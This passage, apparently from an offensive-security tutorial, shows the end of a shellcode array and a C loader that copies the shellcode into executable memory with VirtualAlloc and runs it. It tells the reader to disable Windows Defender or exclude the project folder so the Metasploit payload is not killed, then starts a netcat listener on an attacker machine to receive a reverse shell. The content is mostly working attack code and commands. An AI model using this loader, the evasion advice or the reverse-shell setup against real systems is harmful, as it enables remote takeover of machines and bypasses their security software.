"\xc0\x03\x5f\xd6\xaa\x1b\x40\xf9\x4a\x01\x40\xf9\x6a\xfc"
"\xff\x17";

int main()
{
    void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}
```

If desired, use `CTRL+SHIFT+B` to build the project.

{% hint style="info" %}
**Note:** you're more than likely going to need to disable Windows Defender entirely or add an exclusion to the project folder your loader is working in since we are using a known Metasploit signature which Win Defender will recognize and immediately terminate your process, killing the reverse shell connection.&#x20;
{% endhint %}

### Obtaining Reverse Shell Connection

**On your attacker machine, start a `netcat` listener:**

```
nc -lnvp 1337
```

**Then, run the binary.**

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Enjoy your shell!**

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
